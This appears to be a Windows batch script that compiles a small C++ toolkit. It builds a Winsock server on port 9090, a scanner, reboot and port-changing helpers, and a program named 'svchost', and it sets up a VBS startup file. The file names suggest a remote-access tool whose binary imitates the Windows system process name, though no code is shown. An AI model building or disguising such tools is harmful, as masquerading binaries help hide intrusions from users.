set path=%cd%\compile\bin
echo %path%
cd sources
windres -i "../bin/rec.rc" --input-format=rc -o "../bin/rec.res" -O coff
g++ -c serv.cpp -o serv.o
g++ serv.o ../bin/rec.res -o ../bin/serv -lws2_32
del serv.o

g++ svchost.cpp -o ../bin/svchost
g++ chport.cpp -o ../bin/chport
g++ reboot.cpp -o ../bin/reboot
g++ exit.cpp -o ../bin/exit
g++ sound.cpp -o ../bin/sound
g++ fillvbs.cpp -o ../bin/fillvbs
windres -i "../bin/recForScan.rc" --input-format=rc -o "../bin/recForScan.res" -O coff
g++ -c scanner.cpp -o scanner.o
g++ scanner.o ../bin/recForScan.res -o ../bin/scanner
del scanner.o
mkdir ..\\log
mkdir ..\\settings
mkdir ..\\sounds
touch ..\\log\\startapp.log
touch ..\\settings\\config.cfg
touch ..\\sounds\\mstart.vbs
echo port=9090 > ..\\settings\\config.cfg
echo bytesRecieved=4096 >> ..\\settings\\config.cfg
pause